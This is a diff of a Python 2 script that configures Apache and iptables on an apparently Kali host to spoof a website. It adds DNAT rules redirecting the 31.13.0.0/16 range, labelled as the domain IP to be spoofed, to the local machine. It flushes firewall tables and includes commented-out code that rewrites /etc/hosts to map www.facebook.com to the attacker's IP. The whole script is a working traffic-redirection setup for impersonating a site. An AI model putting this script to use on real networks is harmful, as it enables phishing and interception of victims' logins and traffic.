@@ -10,7 +10,6 @@ p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.
 print cmd
 print p.wait()
 (output, error) = p.communicate()
-print (output, error), "\n"
 rawIPList = output.split()
 modIPList = []
 myIP = ""
@@ -40,6 +39,17 @@ if os.path.isfile(confPath):
     f.close()
     del f
 
+# hostFileServerToSpoof = "www.facebook.com"
+# hostFilePath = "/etc/hosts"
+# hostConf = "127.0.0.1\tlocalhost\n127.0.1.1\tkali\n" + myIP + "\t" + hostFileServerToSpoof + "\n# The following lines are desirable for IPv6 capable hosts\n::1\tlocalhost ip6-localhost ip6-loopback\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n"
+# if os.path.isfile(confPath):
+#     if not os.path.isfile(confPathBak):
+#         shutil.copyfile(confPath, confPathBak)
+#     f = open(hostFilePath, "w")
+#     f.write(hostConf)
+#     f.close()
+#     del f
+
 # Restart apache service.
 cmd = "service apache2 restart"
 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -54,22 +64,22 @@ print cmd
 print p.wait()
 print p.communicate(), "\n"
 
-# Configure routing table for the first domain IP.
-cmd = "iptables -t nat -A PREROUTING -d 31.13.69.1/24 -j DNAT --to-destination " + myIP
+# Flush IP Tables
+cmd = "iptables -t nat -F"
 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 print cmd
 print p.wait()
 print p.communicate(), "\n"
 
-# Configure routing table for the second domain IP.
-cmd = "iptables -t nat -A PREROUTING -d 31.13.70.1/24 -j DNAT --to-destination " + myIP
+# Flush IP Tables
+cmd = "iptables -F"
 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 print cmd
 print p.wait()
 print p.communicate(), "\n"
 
-# Configure routing table for the third domain IP.
-cmd = "iptables -t nat -A PREROUTING -d 31.13.71.1/24 -j DNAT --to-destination " + myIP
+# Configure routing table for the domain IP to be spoofed.
+cmd = "iptables -t nat -A PREROUTING -d 31.13.0.0/16 -j DNAT --to-destination " + myIP
 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 print cmd
 print p.wait()
@@ -77,6 +87,19 @@ print p.communicate(), "\n"
 
 # Configure the routing table to accept incoming traffic on port 80.
 cmd = "iptables -A INPUT -p tcp --dport 80 -j ACCEPT"
+p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+print cmd
+print p.wait()
+print p.communicate(), "\n"
+
+cmd = "iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT"
+p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+print cmd
+print p.wait()
+print p.communicate(), "\n"
+
+# Flush IP Tables
+cmd = "iptables-save"
 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 print cmd
 print p.wait()
